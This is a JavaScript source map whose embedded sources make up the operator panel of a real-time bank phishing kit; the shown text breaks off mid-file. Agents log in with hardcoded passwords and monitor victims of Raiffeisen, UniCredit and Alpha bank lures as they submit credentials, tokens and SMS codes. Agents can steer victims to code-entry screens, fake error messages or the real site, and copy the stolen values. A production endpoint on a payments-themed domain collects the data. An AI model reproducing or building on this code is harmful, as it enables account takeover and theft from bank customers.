{"version":3,"sources":["utils/namespace-util.js","utils/constants.js","utils/utils.js","config/config.js","utils/client.js","utils/notification.js","utils/messages.js","components/UserContext.js","components/User.js","components/Users.js","components/Messages.js","components/Welcome.js","components/Auth.js","App.js","serviceWorker.js","index.js"],"names":["createNamespace","prefix","keys","Object","reduce","newKeys","key","createEnum","undefined","BankTypes","RAIFFEISEN","UNI_CREDIT","ALPHA","UserStatus","NEW","OLD","IGNORE","IMPORTANT","UserActions","ENTER_HOMEPAGE","NEW_USER","TYPING","LOGGING","SEND_CREDENTIALS","SEND_TOKEN","SEND_SMS","SEND_TECH_DATA","RAIF_SEND_AUTH_CODE","RAIF_SEND_SMART_TOKEN","RAIF_SEND_SMART_TOKEN_SMS","AgentInstructions","GO_TO_HOME_SCREEN","SHOW_LOADING_STATE","ERR_MSG_INVALID_CREDENTIALS","GO_TO_ORIGINAL_SITE","GO_TO_TOKEN_SCREEN","GO_TO_SMS_SCREEN","GO_TO_TECH_SCREEN","RAIF_GO_TO_AUTH_CODE_SCREEN","RAIF_GO_TO_SMART_TOKEN","RAIF_GO_TO_SMART_TOKEN_SMS","AppStorage","JSON","parse","sessionStorage","getItem","val","setItem","stringify","id","username","password","isLockedByAgent","u","lockedBy","agent","isImportant","status","isIgnored","config","restURL","pullingInterval","REST","ajax","path","method","body","options","updateLastActive","lastActive","axios","url","data","headers","then","json","beep","Audio","fart","ACTIONS_TO_NOTIFY","isNewUser","users","acc","isNewImportantMsg","messages","find","msg","includes","action","notify","play","MSG_PULLING_INTERVAL","Messaging","init","start","okCallback","errCallback","setInterval","a","send","userId","catch","e","window","alert","type","mapUsersToMessages","user","isTyping","length","tokens","push","payload","ret","setTimeout","mapUserToMessages","filter","filterUserMessages","UserContext","createContext","UserContextProvider","props","useState","setUserId","Provider","value","children","toggleLockUser","locked","stopPropagation","agentId","User","useContext","className","onClick","description","Lock","lockedByAgent","agents","lockedByCurrentAgent","React","Component","Users","usersData","sorted","sortItems","values","setFilter","filtered","filterItems","Filter","map","onChange","target","criteria","predicate","lockCriteria","importantCriteria","ignoreCriteria","sort","u1","u2","ign1","ign2","lock1","lock2","imp1","imp2","tokens1","tokens2","trim","toString","Messages","userData","UserMessages","Actions","Message","message","isUserMessage","time","UserCredentialsMessage","AgentInstructionMessage","moment","format","label","split","item","str","el","document","createElement","setAttribute","style","position","left","appendChild","select","execCommand","removeChild","copyStringToClipboard","setDescription","margin","bank","updateDescription","updateStatus","ActionWithPayload","text","setPayload","Welcome","state","console","log","oldMessages","newMessages","oldUsers","newUsers","setState","forEach","newUser","idx","findIndex","o","m","this","Auth","isLogged","loggedAgent","logged","setLogged","Login","setUsername","setPassword","setBank","error","setError","name","defaultValue","ALFA","placeholder","authenticate","process","App","Boolean","location","hostname","match","ReactDOM","render","StrictMode","getElementById","navigator","serviceWorker","ready","registration","unregister"],"mappings":"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","file":"static/js/main.195dacad.chunk.js","sourcesContent":["export const createNamespace = (prefix, keys) => (\r\n  Object.keys(keys).reduce((newKeys, key) => {\r\n    newKeys[key] = prefix ? `${prefix}.${key}` : `${key}`\r\n    return newKeys\r\n  }, {})\r\n)\r\n\r\nexport const createEnum = keys => createNamespace(undefined, keys)\r\n\r\n\r\n\r\n","import { createNamespace, createEnum } from './namespace-util'\r\n\r\nexport const BankTypes = createEnum({\r\n  RAIFFEISEN: undefined,\r\n  UNI_CREDIT: undefined,\r\n  ALPHA: undefined,\r\n})\r\n\r\nexport const UserStatus = createEnum({\r\n  NEW: undefined,\r\n  OLD: undefined,\r\n  IGNORE: undefined,\r\n  IMPORTANT: undefined,\r\n})\r\n\r\nexport const UserActions = createNamespace('USER', {\r\n  ENTER_HOMEPAGE: undefined,\r\n  NEW_USER: undefined,\r\n  TYPING: undefined,\r\n  LOGGING: undefined,\r\n  SEND_CREDENTIALS: undefined,\r\n  SEND_TOKEN: undefined,\r\n  SEND_SMS: undefined,\r\n  SEND_TECH_DATA: undefined,\r\n\r\n  RAIF_SEND_AUTH_CODE: undefined,\r\n  RAIF_SEND_SMART_TOKEN: undefined,\r\n  RAIF_SEND_SMART_TOKEN_SMS: undefined,\r\n})\r\n\r\nexport const AgentInstructions = createNamespace('INSTR', {\r\n  GO_TO_HOME_SCREEN: undefined,\r\n  SHOW_LOADING_STATE: undefined,\r\n  ERR_MSG_INVALID_CREDENTIALS: undefined,\r\n  GO_TO_ORIGINAL_SITE: undefined,\r\n  GO_TO_TOKEN_SCREEN: undefined,\r\n  GO_TO_SMS_SCREEN: undefined,\r\n  GO_TO_TECH_SCREEN: undefined,\r\n\r\n  RAIF_GO_TO_AUTH_CODE_SCREEN: undefined,\r\n  RAIF_GO_TO_SMART_TOKEN: undefined,\r\n  RAIF_GO_TO_SMART_TOKEN_SMS: undefined,\r\n})\r\n\r\nexport const CREDENTIALS_DELIMETER = ';;'\r\n\r\n\r\n\r\n","import { UserStatus } from './constants'\r\n\r\nexport const AppStorage = {\r\n  get agent() { return JSON.parse(sessionStorage.getItem('agent')); },\r\n  set agent(val) { sessionStorage.setItem('agent', JSON.stringify(val)); },\r\n  \r\n  get bank() { return JSON.parse(sessionStorage.getItem('bank')); },\r\n  set bank(val) { sessionStorage.setItem('bank', JSON.stringify(val))},\r\n\r\n  get agents() {\r\n    return [\r\n      { id: 1, username: 'agent1', password: '1passw' },\r\n      { id: 2, username: 'agent2', password: '2passw' },\r\n      { id: 7, username: 'admin', password: '1admin1' },\r\n    ]\r\n  }\r\n\r\n}\r\n\r\nexport const isLocked = u => u.lockedBy\r\nexport const isLockedByAgent = u => u.lockedBy === AppStorage.agent.id\r\nexport const isImportant = u => u.status === UserStatus.IMPORTANT\r\nexport const isIgnored = u => u.status === UserStatus.IGNORE\r\n\r\nexport const copyStringToClipboard = (str) => {\r\n  // Create new element\r\n  var el = document.createElement('textarea');\r\n  // Set value (string to be copied)\r\n  el.value = str;\r\n  // Set non-editable to avoid focus and move outside of view\r\n  el.setAttribute('readonly', '');\r\n  el.style = {position: 'absolute', left: '-9999px'};\r\n  document.body.appendChild(el);\r\n  // Select text inside element\r\n  el.select();\r\n  // Copy text to clipboard\r\n  document.execCommand('copy');\r\n  // Remove temporary element\r\n  document.body.removeChild(el);\r\n}\r\n","const configGlobal = {\r\n  development: {\r\n    // restURL: \"https://paymentsonline.a2hosted.com/token/rest\",\r\n    restURL: \"http://localhost:5000/token/rest\",\r\n  },\r\n  production: {\r\n    restURL: \"https://paymentsonline.a2hosted.com/token/rest\",\r\n  },\r\n}\r\n\r\nexport const config = {\r\n  ...configGlobal[process.env.NODE_ENV],\r\n  pullingInterval: 1300\r\n}\r\n\r\n\r\n","import axios from 'axios'\r\nimport { getUTCTimestamp } from './time'\r\nimport { AppStorage } from './utils'\r\nimport { config } from './../config/config'\r\n\r\n\r\n\r\n\r\n\r\nconst REST = config.restURL\r\n\r\n\r\nexport const ajax = (path, method = 'GET', body, options = { updateLastActive: true }) => {\r\n\r\n  const { updateLastActive } = options\r\n\r\n  const lastActive = AppStorage.lastActive || 0\r\n\r\n  // if (updateLastActive) {\r\n  //   AppStorage.lastActive = 